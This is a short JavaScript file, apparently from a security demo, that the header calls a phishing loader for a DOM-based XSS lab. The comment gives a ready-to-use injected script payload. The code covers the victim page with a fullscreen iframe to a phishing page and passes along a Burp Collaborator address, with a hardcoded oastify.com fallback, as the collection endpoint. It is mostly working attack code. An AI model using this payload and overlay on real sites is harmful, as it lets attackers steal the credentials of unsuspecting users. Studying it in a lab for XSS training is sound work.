/**
 * Phishing loader for guest DOM-based XSS demo.
 * Load this script after setting window.BURP_COLLAB to your Burp Collaborator URL (e.g. https://YOUR-ID.oastify.com).
 * Example payload in DomXSS page:
 *   <script>window.BURP_COLLAB='https://YOUR-ID.oastify.com';</script><script src="https://YOUR-HOST/phishing-loader.js"></script>
 * This script creates a fullscreen iframe pointing to phishing.html with the collab param.
 */
(function () {
  var base = (function () {
    var s = document.currentScript && document.currentScript.src;
    if (s) {
      var i = s.lastIndexOf('/');
      return i >= 0 ? s.slice(0, i + 1) : s;
    }
    return '';
  })();
  var collab = typeof window.BURP_COLLAB === 'string' && window.BURP_COLLAB
    ? window.BURP_COLLAB
    : 'https://e6l7qy1188bnm40b0wlz9aeoofu9iz6o.oastify.com'; // fallback if not set
  var phishingUrl = base + 'phishing.html?collab=' + encodeURIComponent(collab);
  var iframe = document.createElement('iframe');
  iframe.src = phishingUrl;
  iframe.setAttribute('style', 'position:fixed;top:0;left:0;width:100%;height:100%;border:0;z-index:999999;');
  document.body.appendChild(iframe);
})();
